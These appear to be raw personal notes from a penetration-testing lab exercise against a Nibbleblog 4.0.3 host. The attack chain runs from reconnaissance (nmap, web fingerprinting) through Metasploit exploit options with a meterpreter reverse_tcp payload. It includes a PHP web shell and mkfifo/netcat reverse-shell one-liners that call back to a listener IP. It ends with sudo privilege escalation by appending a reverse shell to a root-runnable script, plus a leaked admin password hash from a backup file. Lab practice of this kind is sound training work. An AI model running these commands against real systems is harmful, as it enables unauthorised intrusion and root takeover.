# Nmap 7.92 scan initiated Sun Apr 10 18:04:05 2022 as: nmap -oG - 10.129.122.75
Host: 10.129.122.75 ()  Status: Up
Host: 10.129.122.75 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///       Ignored State: closed (998)
# Nmap done at Sun Apr 10 18:04:21 2022 -- 1 IP address (1 host up) scanned in 15.74 seconds


http://10.129.122.75/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.122.75], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]




   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   USERNAME                    yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  178.128.174.74   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3



################################

Some random notes ... maybe from the final exercise in the Getting Start module? 

curl http:/10.129.86.175/nibbleblog/content/private/plugins/my_image/image.php
nc -lnvp 12808

python3 -c 'import pty; pty.spawn("/bin/bash")'
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.25 12808 >/tmp/f"); ?>

sudo python3 -m http.server 8080


[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh


echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.25 12809 >/tmp/f' | tee -a monitor.sh


http://10.129.230.192/backups/users/admin.xml.bak


<item>
<USR>admin</USR>
<NAME/>
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
<EMAIL>admin@gettingstarted.com</EMAIL>
<HTMLEDITOR>1</HTMLEDITOR>
<TIMEZONE/>
<LANG>en_US</LANG>
</item>
